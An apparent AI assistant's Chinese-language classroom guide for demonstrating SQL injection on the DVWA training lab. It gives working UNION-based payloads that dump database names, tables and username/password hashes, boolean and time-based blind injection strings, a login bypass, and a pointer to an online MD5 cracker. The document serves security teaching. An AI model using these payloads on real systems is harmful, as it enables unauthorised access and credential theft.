好的！以下是为你优化过的**SQL 注入操作展示文档**，结构更清晰，语言更简洁，便于**课堂演示、报告写作或复习使用**。我也加入了**小标题、关键点提示符号、演示建议**，帮助你当场讲解或截图。

---

# 🧪 DVWA SQL 注入演示操作文档（优化版）

---

## 🧱 一、基础 SQL 注入（Basic / Union-Based）

适用于有明显**页面回显**的模块，例如：
- `SQL Injection`
- 登录页（Login）
- 搜索功能

---

### 💣 常用 Payload（修正版 ✅）

> ⚠️ 注释必须使用空格：`-- `，否则 MariaDB 会报错！

| 类型 | Payload | 功能说明 |
|------|---------|----------|
| 登录绕过 | `' or 1=1 -- ` | 绕过登录验证（可用于 login 页面） |
| 显示数据库版本 | `' UNION SELECT null, @@version -- ` | 获取 MySQL/MariaDB 版本信息 |
| 当前数据库名 | `' UNION SELECT null, database() -- ` | 查看当前使用的数据库 |
| 当前连接用户 | `' UNION SELECT null, user() -- ` | 显示当前数据库登录用户 |
| 列出表名 | `' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- ` | 列出当前数据库下所有表 |
| 列出字段名 | `' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' -- ` | 查看表字段（需改成实际表名） |
| 提取用户名密码 | `' UNION SELECT null, concat(username, ':', password) FROM users -- ` | 提取数据（字段需确认） |

---

### ✅ 推荐演示步骤（SQL Injection 模块）

1. 进入 DVWA，点击左侧菜单：**`SQL Injection`**
2. 在输入框测试基本注入：
   ```
   ' or 1=1 -- 
   ```
   页面正常返回数据，说明注入成功
3. 接着执行：
   ```sql
   ' UNION SELECT null, database() -- 
   ```
   成功显示数据库名（如：`dvwa`）

4. 获取表名：
   ```sql
   ' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- 
   ```

5. 找到表名 `users` 或类似，继续查询字段名：
   ```sql
   ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' -- 
   ```

6. 如果你看到字段 `username` 和 `password`，继续用：
   ```sql
   ' UNION SELECT null, concat(username, ':', password) FROM users -- 
   ```
   🔥 页面应显示用户名与密码 hash。

---

## 👀 二、盲注（Blind SQL Injection）

适用于**页面无明显输出**，但可以通过页面是否变化判断注入效果。DVWA 的：
> `SQL Injection (Blind)` 模块就是此类型。

---

### 🔍 布尔盲注 Payload

| Payload | 条件 | 页面结果 |
|---------|-------|-------------|
| `1' AND 1=1 -- ` | 真 | 页面正常 |
| `1' AND 1=2 -- ` | 假 | 页面不同或空白 |
| `1' AND SUBSTRING(database(),1,1)='d' -- ` | 判断数据库首字母是否为 d | 页面结果判断真假 |

> ✅ 成功关键：**前后页面内容有明显差异！**

---

### ⏱️ 时间盲注 Payload（若支持时间函数）

> 通过页面响应时间判断条件真假。

| Payload | 功能说明 |
|--------|-------------|
| `1' AND IF(1=1, SLEEP(3), 0) -- ` | 页面延迟 3 秒（条件成立） |
| `1' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0) -- ` | 猜测当前用户第一位是否为 r |

---

### ✅ 推荐演示步骤（SQL Injection Blind 模块）

1. 点击 DVWA 菜单：**`SQL Injection (Blind)`**
2. 输入：
   ```sql
   1' AND 1=1 -- 
   ```
   页面正常显示

3. 输入：
   ```sql
   1' AND 1=2 -- 
   ```
   页面空白或不同，说明注入有效

4. 试探数据库名：
   ```sql
   1' AND SUBSTRING(database(),1,1)='d' -- 
   ```
   页面正常则表示猜中，否则继续试 a~z

---

## 🧩 常见错误与解决方案

| 问题类型 | 错误表现 | 正确写法或说明 |
|----------|------------|----------------|
| 注释错误 | 报 SQL syntax 错误 | 使用 `-- `（后面有空格）或 `#` |
| 引号不匹配 | near `'''` 报错 | 开头加 `'`，结尾用注释关闭：`' or 1=1 -- ` |
| 字段数错误 | UNION 报错 | 使用 `' ORDER BY n -- ` 确定字段数量 |

---

## 🧠 常用探测顺序建议

1. `' ORDER BY 1 -- ` 逐步测试字段数量
2. `' UNION SELECT 1,2 -- ` 看哪列可以回显
3. `' UNION SELECT null, database() -- ` 进行信息提取
4. 枚举表名、字段名
5. 提取数据，用 concat 拼接字段输出

---

## 🎁 模块推荐 + 练习组合（DVWA）

| 模块名称 | 推荐攻击方式 | 说明 |
|----------|---------------|------|
| SQL Injection | UNION 查询注入 | 页面有回显 |
| SQL Injection (Blind) | 布尔盲注、时间盲注 | 页面无回显，通过变化判断 |
| Login 页面 | `' or 1=1 -- ` 绕过 | 用于身份绕过攻击 |
| 安全等级设置 | 低（Low） | 建议使用 Low 练习所有注入功能 |

---

## 📸 演示注意事项（截图建议）

- 每次攻击成功后，请截图以下内容：
  - 输入框中 payload
  - 页面显示的数据（如用户名密码、数据库名）
  - 地址栏 URL 一起截进去
- 不要关闭窗口，老师会现场检查！

---

## 📝 Bonus：推荐工具（如果课堂允许使用）

| 工具 | 用途 |
|------|------|
| Burp Suite | 拦截和重放 HTTP 请求 |
| sqlmap | 自动化 SQL 注入（练习用，演示慎用） |
| HackBar（浏览器插件） | 快速测试 payload |
| Online Hash Cracker | 解密 MD5 密码 hash：[https://crackstation.net](https://crackstation.net) |

---

如果你需要：

- ✅ 打包成 PDF 演示版  
- ✅ 制作 Markdown 笔记格式  
- ✅ 加入配图版演示参考截图

我可以直接整理并发给你！要不要我帮你生成这份文档的 PDF？📄